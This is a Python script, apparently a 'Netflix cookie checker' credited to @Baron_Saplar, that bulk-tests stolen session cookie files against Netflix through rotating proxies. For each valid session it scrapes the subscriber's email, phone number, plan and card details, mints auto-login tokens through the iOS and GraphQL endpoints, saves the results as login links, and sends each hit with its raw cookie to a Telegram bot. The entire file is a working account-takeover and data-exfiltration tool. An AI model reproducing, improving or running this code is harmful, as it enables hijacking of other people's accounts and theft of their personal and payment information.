
import re
import json
import random
import time
import os
import threading
import requests
import urllib3
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

UA_WEB = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/131.0.0.0 Safari/537.36"
)
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"

COUNTRY_FLAGS = {
    "US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹",
    "TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦",
    "AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰",
    "FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴",
    "PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩",
    "MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪",
    "NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿",
    "UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼",
    "HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾",
    "NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬",
}
COUNTRY_NAMES = {
    "US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France",
    "ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan",
    "KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico",
    "NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland",
    "PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia",
    "PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa",
    "ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam",
    "PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal",
    "RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine",
    "AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan",
    "HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia",
    "HR":"Croatia","RS":"Serbia","BG":"Bulgaria",
}
def _djs(s):
    if not s:
        return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

def _rx_all(pattern, text):
    return re.findall(pattern, text, re.S)

def _flag(cc):
    return COUNTRY_FLAGS.get((cc or "").upper(), "🌍")

def _country(cc):
    return COUNTRY_NAMES.get((cc or "").upper(), cc or "Unknown")

def parse_netscape(text):

    cookies = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies

def parse_json_cookies(text):

    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}

def load_cookies(text):
  
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        c = parse_json_cookies(text)
        if c:
            return c
    c = parse_netscape(text)
    if c:
        return c
    cookies = {}
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k:
                cookies[k] = v
    return cookies

_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1",
    "config": ('{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false",'
               '"cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true",'
               '"billboardEnabled":"true","sharksEnabled":"true",'
               '"useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}'),
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):

    if not netflix_id_raw:
        return None

    netflix_id = urllib.parse.unquote(str(netflix_id_raw))
    proxies = {"http": proxy, "https": proxy} if proxy else None

    headers = dict(_IOS_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        r = requests.get(
            _IOS_API,
            params=_IOS_PARAMS,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=False,
        )
        if r.status_code == 200:
            data = r.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {})
                 .get("token") or {})
                .get("default") or {}
            )
            tok = token_data.get("token")
            if tok:
                return str(tok)
    except Exception:
        pass

    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        if proxies:
            sess2.proxies = proxies
            sess2.verify = False
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849",
                }
            },
        }
        r2 = sess2.post(
            "https://android13.prod.ftl.netflix.com/graphql",
            json=payload,
            headers={
                "User-Agent": UA_ANDROID,
                "Accept": "application/json",
                "Content-Type": "application/json",
            },
            timeout=timeout,
        )
        if r2.status_code == 200:
            d = r2.json()
            tok = (d.get("data") or {}).get("createAutoLoginToken")
            if tok:
                return str(tok)
    except Exception:
        pass

    return None

def check_account(cookies: dict, proxy=None, timeout=20):

    if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
        return None

    sess = requests.Session()
    sess.headers.update({
        "User-Agent": UA_WEB,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "DNT": "1",
    })
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
        sess.verify = False

    try:
        r = sess.get(
            "https://www.netflix.com/account",
            allow_redirects=True,
            timeout=timeout,
        )
    except requests.RequestException:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text

    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))

    name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
    if not name:
        name = _djs(_rx(r'"firstName":"([^"]+)"', html))

    cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")

    since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
    if not since:
        ts_raw = _rx(r'"memberSince":\{"fieldType":"Numeric","value":(\d+)\}', html)
        if ts_raw and ts_raw.isdigit():
            try:
                since = datetime.utcfromtimestamp(int(ts_raw) / 1000).strftime("%B %Y")
            except Exception:
                since = "N/A"

    plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))

    plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)

    price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))

    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
    quality_map = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}
    quality = quality_map.get(q_raw, q_raw or "N/A")

    streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")

    nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))

    _pm_start = html.find('"paymentMethods"')
    pm_raw = html[_pm_start:_pm_start + 3000] if _pm_start >= 0 else ""
    card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
    if not card_brand:
        card_brand = _rx(r'"type":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    pay_type   = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
    card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
    if not card_last4:
        card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)

    phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"

    pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
    phone_verified = pv_raw == "true"

    extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
    extra_slots = int(extra_raw) if extra_raw.isdigit() else 0

    can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html

    free_trial = '"isInFreeTrial":true' in html

    profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
    if not profiles:
        profiles = [_djs(p) for p in _rx_all(
            r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
    seen = set()
    profiles_clean = []
    for p in profiles:
        if p and p not in seen:
            seen.add(p)
            profiles_clean.append(p)

    user_guid = _rx(r'"userGuid":"([^"]+)"', html)

    netflix_id_raw = cookies.get("NetflixId", "")
    tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
    if tok:
        tok_safe    = urllib.parse.quote(tok, safe="")
        login_pc    = f"https://netflix.com/?nftoken={tok_safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else:
        login_pc    = "N/A"
        login_phone = "N/A"
    login_tv = "https://www.netflix.com/tv2"

    display_name = name or (profiles_clean[0] if profiles_clean else "N/A")

    return {
        "email":          email or "N/A",
        "name":           display_name,
        "country_code":   cc,
        "country":        _country(cc),
        "plan":           plan or "N/A",
        "plan_id":        plan_id or "N/A",
        "price":          price or "N/A",
        "member_since":   since or "N/A",
        "next_billing":   nextbill or "N/A",
        "free_trial":     free_trial,
        "can_change":     can_change,
        "video_quality":  quality,
        "max_streams":    str(streams),
        "extra_slots":    extra_slots,
        "card_brand":     card_brand or "N/A",
        "card_last4":     card_last4 or "N/A",
        "payment_method": pay_type or "N/A",
        "phone":          phone,
        "phone_verified": phone_verified,
        "profiles":       profiles_clean,
        "profile_count":  len(profiles_clean),
        "user_guid":        user_guid or "N/A",
        "netflix_id_raw":   netflix_id_raw,
        "login_pc":         login_pc,
        "login_phone":      login_phone,
        "login_tv":         login_tv,
    }

class NetflixChecker:
    def __init__(self, telegram_token=None, telegram_chat_id=None,
                 threads=5, proxy=None, timeout=20):
        self.telegram_token    = telegram_token
        self.telegram_chat_id  = telegram_chat_id
        self.threads           = threads
        self._proxy_list  = proxy if isinstance(proxy, list) else ([proxy] if proxy else [])
        self._proxy_index = 0
        self.timeout           = timeout

        self.lock   = threading.Lock()
        self.stats  = {
            "total":   0,
            "checked": 0,
            "hits":    0,
            "bad":     0,
            "errors":  0,
            "start":   time.time(),
        }
        self.hits = []

    def _next_proxy(self):
       
        if not self._proxy_list:
            return None
        with self.lock:
            p = self._proxy_list[self._proxy_index % len(self._proxy_list)]
            self._proxy_index += 1
        if p and not p.startswith(("http://", "https://", "socks4://", "socks5://")):
            p = "http://" + p
        return p

    def _telegram_send(self, caption, markup=None):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        try:
            payload = {
                "chat_id": self.telegram_chat_id,
                "text": caption,
                "parse_mode": "HTML",
                "disable_web_page_preview": "true",
            }
            if markup:
                payload["reply_markup"] = json.dumps(markup)
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_token}/sendMessage",
                data=payload,
                timeout=15,
            )
        except Exception:
            pass

    def _telegram_send_text(self, text):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        try:
            payload = {
                "chat_id": self.telegram_chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": "true",
            }
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_token}/sendMessage",
                data=payload,
                timeout=15,
            )
        except Exception:
            pass

    def _telegram_hit(self, acc, n):
        cc    = acc.get("country_code", "XX")
        flag  = _flag(cc)
        p     = acc.get("profiles", [])
        profs = ", ".join(p[:4]) if p else "N/A"
        pv    = "✅" if acc.get("phone_verified") else "❌"

        nf_id = acc.get("netflix_id_raw", "")
        full_cookie = acc.get("cookie_raw", "")
        cookie_val = f"NetflixId={nf_id}" if nf_id else full_cookie

        caption = (
            f"🎬 <b>NETFLIX HIT #{n}</b>\n\n"
            f"👤 <b>{acc['name']}</b>\n"
            f"📧 <code>{acc['email']}</code>\n"
            f"🌍 {acc['country']} {flag} ({cc})\n\n"
            f"📋 <b>{acc['plan']}</b>  •  💰 {acc['price']}\n"
            f"📅 Since: {acc['member_since']}\n"
            f"🗓 Billing: {acc['next_billing']}\n"
            f"🎁 Free Trial: {'Yes' if acc['free_trial'] else 'No'}\n\n"
            f"🎥 {acc['video_quality']}  |  📺 {acc['max_streams']} streams  |  ➕ {acc['extra_slots']} extra\n"
            f"💳 {acc['card_brand']} *{acc['card_last4']}  •  {acc['payment_method']}\n"
            f"📞 {acc['phone']}  {pv}\n"
            f"👥 Profiles ({acc['profile_count']}): {profs}\n\n"
            f"🍪 <b>Cookie</b>\n"
            f"<code>{cookie_val}</code>\n\n"
            f"@Baron_Saplar"
        )

        buttons = []
        row1 = []
        if acc.get("login_pc") and acc["login_pc"] != "N/A":
            row1.append({"text": "🖥 Click to PC", "url": acc["login_pc"]})
        if acc.get("login_phone") and acc["login_phone"] != "N/A":
            row1.append({"text": "📱 Click to Phone", "url": acc["login_phone"]})
        if row1:
            buttons.append(row1)
        buttons.append([{"text": "📺 Click to TV", "url": acc["login_tv"]}])

        markup = {"inline_keyboard": buttons}
        self._telegram_send(caption, markup)

    def process_file(self, filepath, idx):
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                raw = f.read()
        except Exception:
            with self.lock:
                self.stats["errors"] += 1
            return

        cookies = load_cookies(raw)

        try:
            result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
        except Exception:
            with self.lock:
                self.stats["errors"] += 1
                self.stats["checked"] += 1
            return

        with self.lock:
            self.stats["checked"] += 1
            if result:
                self.stats["hits"] += 1
                n = self.stats["hits"]
                result["source"] = os.path.basename(filepath)
                result["cookie_raw"] = raw.strip()
                self.hits.append(result)
                self._save_hit(result, raw)
                self._telegram_hit(result, n)
                cc  = result["country_code"]
                print(
                    f"{Fore.GREEN}[✓] HIT #{n:>4}  "
                    f"{result['email']:<38} "
                    f"{result['plan']:<14} "
                    f"{cc} {_flag(cc)}{Style.RESET_ALL}"
                )
            else:
                self.stats["bad"] += 1
                if idx % 20 == 0:
                    print(f"{Fore.RED}[-] BAD  {os.path.basename(filepath)}{Style.RESET_ALL}")

    def _save_hit(self, acc, raw_cookie):
        os.makedirs("hits", exist_ok=True)
        safe_email = re.sub(r'[\\/:*?"<>|]', "_", acc["email"])
        fname = f"[{acc['country_code']}] [{safe_email}] - {acc['plan']}.txt"
        path  = os.path.join("hits", fname)

        profs = ", ".join(acc["profiles"]) if acc["profiles"] else "N/A"

        with open(path, "w", encoding="utf-8") as f:
            f.write("=" * 70 + "\n")
            f.write("              NETFLIX PREMIUM ACCOUNT\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"👤  Name:           {acc['name']}\n")
            f.write(f"📧  Email:          {acc['email']}\n")
            f.write(f"🌍  Country:        {acc['country']} ({acc['country_code']})\n\n")
            f.write(f"📋  Plan:           {acc['plan']}\n")
            f.write(f"💰  Price:          {acc['price']}\n")
            f.write(f"📅  Member Since:   {acc['member_since']}\n")
            f.write(f"📅  Next Billing:   {acc['next_billing']}\n")
            f.write(f"🎁  Free Trial:     {'Yes' if acc['free_trial'] else 'No'}\n\n")
            f.write(f"🎥  Quality:        {acc['video_quality']}\n")
            f.write(f"📺  Max Streams:    {acc['max_streams']}\n")
            f.write(f"➕  Extra Slots:    {acc['extra_slots']}\n\n")
            f.write(f"💳  Card Brand:     {acc['card_brand']}\n")
            f.write(f"🔢  Card Last 4:    {acc['card_last4']}\n")
            f.write(f"💳  Pay Method:     {acc['payment_method']}\n\n")
            f.write(f"📞  Phone:          {acc['phone']}\n")
            f.write(f"✅  Phone Verified: {'Yes' if acc['phone_verified'] else 'No'}\n\n")
            f.write(f"👥  Profiles ({acc['profile_count']}):  {profs}\n")
            f.write(f"🆔  User GUID:      {acc['user_guid']}\n\n")
            f.write("-" * 70 + "\n")
            f.write("🔗  LOGIN LINKS\n")
            f.write("-" * 70 + "\n")
            f.write(f"💻  PC:             {acc['login_pc']}\n")
            f.write(f"📱  Phone:          {acc['login_phone']}\n")
            f.write(f"📺  TV:             {acc['login_tv']}\n\n")
            f.write("-" * 70 + "\n")
            f.write("🍪  RAW COOKIE\n")
            f.write("-" * 70 + "\n")
            f.write(raw_cookie + "\n")
            f.write("=" * 70 + "\n")
            f.write("by @Baron_Saplar // @baroshoping\n")

    def _stats_thread(self):
        while self.stats["checked"] < self.stats["total"]:
            time.sleep(3)
            elapsed = time.time() - self.stats["start"]
            cpm = int((self.stats["checked"] / elapsed) * 60) if elapsed > 0 else 0
            with self.lock:
                pct = (self.stats["checked"] / max(self.stats["total"], 1)) * 100
            print(
                f"\r{Fore.CYAN}[{pct:5.1f}%] "
                f"Checked: {self.stats['checked']}/{self.stats['total']} | "
                f"Hits: {Fore.GREEN}{self.stats['hits']}{Fore.CYAN} | "
                f"Bad: {Fore.RED}{self.stats['bad']}{Fore.CYAN} | "
                f"Err: {Fore.YELLOW}{self.stats['errors']}{Fore.CYAN} | "
                f"CPM: {cpm}{Style.RESET_ALL}",
                end="", flush=True
            )

    def _final_summary(self):
        elapsed = time.time() - self.stats["start"]
        print()
        print(f"\n{Fore.CYAN}{'─'*60}")
        print(f"  RESULT SUMMARY")
        print(f"{'─'*60}{Style.RESET_ALL}")
        print(f"  Total Checked : {self.stats['checked']}")
        print(f"  {Fore.GREEN}Hits          : {self.stats['hits']}{Style.RESET_ALL}")
        print(f"  {Fore.RED}Bad           : {self.stats['bad']}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}Errors        : {self.stats['errors']}{Style.RESET_ALL}")
        print(f"  Time          : {int(elapsed)}s")
        print(f"{Fore.CYAN}{'─'*60}{Style.RESET_ALL}\n")

        if self.hits:
            os.makedirs("results", exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out = os.path.join("results", f"netflix_hits_{ts}.txt")
            with open(out, "w", encoding="utf-8") as f:
                f.write(f"Netflix Hits — {ts}\n{'='*70}\n\n")
                for i, acc in enumerate(self.hits, 1):
                    profs = ", ".join(acc["profiles"]) if acc["profiles"] else "N/A"
                    f.write(f"#{i}\n")
                    f.write(f"Email:        {acc['email']}\n")
                    f.write(f"Name:         {acc['name']}\n")
                    f.write(f"Country:      {acc['country']} ({acc['country_code']})\n")
                    f.write(f"Plan:         {acc['plan']}\n")
                    f.write(f"Price:        {acc['price']}\n")
                    f.write(f"Member Since: {acc['member_since']}\n")
                    f.write(f"Next Billing: {acc['next_billing']}\n")
                    f.write(f"Free Trial:   {'Yes' if acc['free_trial'] else 'No'}\n")
                    f.write(f"Quality:      {acc['video_quality']}\n")
                    f.write(f"Max Streams:  {acc['max_streams']}\n")
                    f.write(f"Extra Slots:  {acc['extra_slots']}\n")
                    f.write(f"Card Brand:   {acc['card_brand']}\n")
                    f.write(f"Card Last 4:  {acc['card_last4']}\n")
                    f.write(f"Pay Method:   {acc['payment_method']}\n")
                    f.write(f"Phone:        {acc['phone']}\n")
                    f.write(f"Phone Verif:  {'Yes' if acc['phone_verified'] else 'No'}\n")
                    f.write(f"Profiles:     {profs}\n")
                    f.write(f"Login PC:     {acc['login_pc']}\n")
                    f.write(f"Login Phone:  {acc['login_phone']}\n")
                    f.write(f"Login TV:     {acc['login_tv']}\n")
                    f.write(f"Source:       {acc.get('source','')}\n")
                    f.write("─"*70 + "\n\n")
            print(f"{Fore.GREEN}[+] Hits saved to: {out}{Style.RESET_ALL}")

    def start(self, folder):
        files = []
        for root, _, fnames in os.walk(folder):
            for fn in fnames:
                if fn.lower().endswith((".txt", ".json")):
                    files.append(os.path.join(root, fn))

        if not files:
            print(f"{Fore.RED}[!] No .txt / .json files found in: {folder}{Style.RESET_ALL}")
            return

        self.stats["total"] = len(files)
        self.stats["start"] = time.time()

        print(f"\n{Fore.CYAN}  Starting Netflix Checker")
        print(f"  Files:   {len(files)}")
        print(f"  Threads: {self.threads}")
        if len(self._proxy_list) > 1:
            print(f"  Proxy:   {len(self._proxy_list)} proxies (rotating)")
        elif self._proxy_list:
            print(f"  Proxy:   {self._proxy_list[0]}")
        else:
            print(f"  Proxy:   None")
        print(f"  Telegram: {'✓' if self.telegram_token else '✗'}")
        print(f"{'─'*60}{Style.RESET_ALL}\n")

        t = threading.Thread(target=self._stats_thread, daemon=True)
        t.start()

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(self.process_file, fp, i): fp
                    for i, fp in enumerate(files, 1)}
            for fut in as_completed(futs):
                try:
                    fut.result(timeout=self.timeout + 10)
                except Exception:
                    with self.lock:
                        self.stats["errors"] += 1

        self._final_summary()

def test_single(cookie_text, proxy=None, timeout=20):
    cookies = load_cookies(cookie_text)
    if not cookies:
        print(f"{Fore.RED}[!] Could not parse cookies.{Style.RESET_ALL}")
        return None

    print(f"{Fore.CYAN}[*] Testing {len(cookies)} cookies against Netflix...{Style.RESET_ALL}")
    result = check_account(cookies, proxy=proxy, timeout=timeout)

    if not result:
        print(f"{Fore.RED}[✗] BAD / Invalid / Not logged in.{Style.RESET_ALL}")
        return None

    cc   = result["country_code"]
    flag = _flag(cc)
    profs = ", ".join(result["profiles"]) if result["profiles"] else "N/A"

    print(f"\n{Fore.GREEN}{'─'*60}")
    print(f"  ✓  VALID NETFLIX ACCOUNT")
    print(f"{'─'*60}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Name         :{Style.RESET_ALL} {result['name']}")
    print(f"  {Fore.WHITE}Email        :{Style.RESET_ALL} {result['email']}")
    print(f"  {Fore.WHITE}Country      :{Style.RESET_ALL} {result['country']} {flag} ({cc})")
    print()
    print(f"  {Fore.CYAN}Plan         :{Style.RESET_ALL} {result['plan']}")
    print(f"  {Fore.CYAN}Price        :{Style.RESET_ALL} {result['price']}")
    print(f"  {Fore.CYAN}Member Since :{Style.RESET_ALL} {result['member_since']}")
    print(f"  {Fore.CYAN}Next Billing :{Style.RESET_ALL} {result['next_billing']}")
    print(f"  {Fore.CYAN}Free Trial   :{Style.RESET_ALL} {'Yes' if result['free_trial'] else 'No'}")
    print()
    print(f"  {Fore.YELLOW}Quality      :{Style.RESET_ALL} {result['video_quality']}")
    print(f"  {Fore.YELLOW}Max Streams  :{Style.RESET_ALL} {result['max_streams']}")
    print(f"  {Fore.YELLOW}Extra Slots  :{Style.RESET_ALL} {result['extra_slots']}")
    print()
    print(f"  {Fore.MAGENTA}Card Brand   :{Style.RESET_ALL} {result['card_brand']}")
    print(f"  {Fore.MAGENTA}Card Last 4  :{Style.RESET_ALL} {result['card_last4']}")
    print(f"  {Fore.MAGENTA}Pay Method   :{Style.RESET_ALL} {result['payment_method']}")
    print()
    print(f"  {Fore.WHITE}Phone        :{Style.RESET_ALL} {result['phone']}")
    print(f"  {Fore.WHITE}Phone Verif  :{Style.RESET_ALL} {'Yes' if result['phone_verified'] else 'No'}")
    print()
    print(f"  {Fore.GREEN}Profiles ({result['profile_count']}) :{Style.RESET_ALL} {profs}")
    print()
    print(f"  {Fore.CYAN}Login PC     :{Style.RESET_ALL} {result['login_pc']}")
    print(f"  {Fore.CYAN}Login Phone  :{Style.RESET_ALL} {result['login_phone']}")
    print(f"  {Fore.CYAN}Login TV     :{Style.RESET_ALL} {result['login_tv']}")
    print(f"{Fore.GREEN}{'─'*60}{Style.RESET_ALL}\n")
    return result

def main():
    print(f"""
{Fore.BLUE}       NETFLIX COOKIE CHECKER  
     @baroshoping  |  @Baron_Saplar             
{Style.RESET_ALL}
""")

    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL} Bulk check (folder of .txt / .json cookie files)")
    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL} Single cookie test (paste cookies)")
    print()
    mode = input(f"  Select mode [1/2]: ").strip()

    if mode == "2":
        print(f"\n  Paste cookies (Netscape .txt, JSON array, or key=value).")
        print(f"  Press Enter twice when done.\n")
        lines = []
        while True:
            line = input()
            if not line and lines and not lines[-1]:
                break
            lines.append(line)
        cookie_text = "\n".join(lines)
        test_single(cookie_text)
        return

    folder = input(f"\n  Cookies folder path: ").strip().strip('"')
    if not os.path.isdir(folder):
        print(f"{Fore.RED}[!] Folder not found: {folder}{Style.RESET_ALL}")
        return

    try:
        threads = int(input(f"  Threads (default 5): ").strip() or "5")
    except ValueError:
        threads = 5

    proxy_raw = input(f"  Proxy (http://ip:port, file path, or blank): ").strip()
    proxy = None
    if proxy_raw:
        if os.path.isfile(proxy_raw):
            with open(proxy_raw, "r", encoding="utf-8", errors="ignore") as _pf:
                _plines = [ln.strip() for ln in _pf if ln.strip() and not ln.startswith("#")]
            if _plines:
                proxy = _plines  
                print(f"  {Fore.CYAN}[*] Loaded {len(_plines)} proxies from file.{Style.RESET_ALL}")
            else:
                print(f"  {Fore.RED}[!] Proxy file is empty.{Style.RESET_ALL}")
        else:
            proxy = proxy_raw  

    use_tg = input(f"  Use Telegram? (y/n): ").strip().lower()
    tg_token = tg_chat = None
    if use_tg == "y":
        tg_token = input(f"  Bot token: ").strip()
        tg_chat  = input(f"  Chat ID  : ").strip()

    checker = NetflixChecker(
        telegram_token=tg_token,
        telegram_chat_id=tg_chat,
        threads=threads,
        proxy=proxy,
        timeout=20,
    )
    try:
        checker.start(folder)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopped by user.{Style.RESET_ALL}")
        checker._final_summary()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting...{Style.RESET_ALL}")
